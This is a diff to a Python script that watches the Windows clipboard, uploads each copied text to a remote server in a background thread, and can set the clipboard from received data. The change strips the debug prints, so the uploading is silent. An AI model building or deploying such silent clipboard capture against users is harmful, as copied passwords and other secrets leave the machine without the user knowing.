@@ -1,6 +1,5 @@
 import win32clipboard
 from time import sleep
-import send
 import runtimeREF
 import requests
 import threading
@@ -17,7 +16,6 @@ def setClipboard(arg):
     win32clipboard.SetClipboardText(arg["data"].decode())
     win32clipboard.CloseClipboard()
     currentClipboard = arg["data"].decode()
-    print(currentClipboard)
 
 
 def getClipboard():
@@ -55,11 +53,9 @@ def onCopy():
                         'headers': {'Content-Type': 'application/octet-stream', 'Content-Disposition': f'attachment;', "fn":"51"},
                     }
                     threading.Thread(target=requests.post, kwargs=args).start()
-                    print("Sending! Clipboard")
             except:
                 continue
             currentClipboard = clipboardText
-            print(currentClipboard)
 
 
 if __name__ == "__main__":
